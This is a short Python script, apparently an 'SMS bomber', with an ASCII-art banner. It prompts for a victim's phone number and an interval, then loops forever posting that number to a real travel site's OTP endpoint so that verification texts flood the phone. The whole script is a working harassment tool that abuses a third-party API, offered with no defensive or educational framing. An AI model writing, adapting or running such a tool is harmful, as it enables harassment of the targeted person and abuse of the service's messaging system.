print(
'''
                        $¶   ¶  ¶¢
           ¶¶¶¶¶¶¶       ¶¢   ¶   ø¶
          ¶¶    ø¶¶¶      oø  ø  øo
          ¶7       ¶¶¶      1´´´1´´´´1o
        ¶¶¶¶¶¶¶      ¶¶¶7   ¢¢ 1o¶¶¶ø
       ¶¶¶¶¶¶¶¶¶         ¶¶¶¶¶¶¶¶  1
     ¶¶¶¶¶¶¶¶¶¶¶¶¶          ¢´´´´o$¢
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         ¢´´1ø´´´1¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         $´´´¶
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶       ¶´´´´o¶´
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
     ¶¶¶¶¶¶¶¶¶¶¶¶´
       ¶¶¶¶¶¶¶¶


 
   ZZZZZZZZZZZZZ          A          LL               XXX         XXX               
            ZZZ          AAA         LL                 XXX     XXX         
          ZZZ           AA AA        LL                   XXX XXX                
        ZZZ            AA   AA       LL                     XXX               
      ZZZ             AAAAAAAAA      LL                   XXX XXX           ____   __       ____   __  ___      
    ZZZ              AA       AA     LL                 XXX     XXX          |__| |  | |\/|  |__| |__  |__|  
   ZZZZZZZZZZZZZ    AA         AA    LLLLLLLLLLLLL    XXX         XXX       _|__| |__| |  | _|__| |__  |  \          
   
'''
    )
              
import requests
import time

target = int(input("Enter your number :"))
sec = int(input("Seconds :"))
url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
c=1

while True:
    time.sleep(sec)
    pyload = {"phoneNumber":target}
    a = requests.post(url, json=pyload)
    print("Sent",c)
    c=c+1
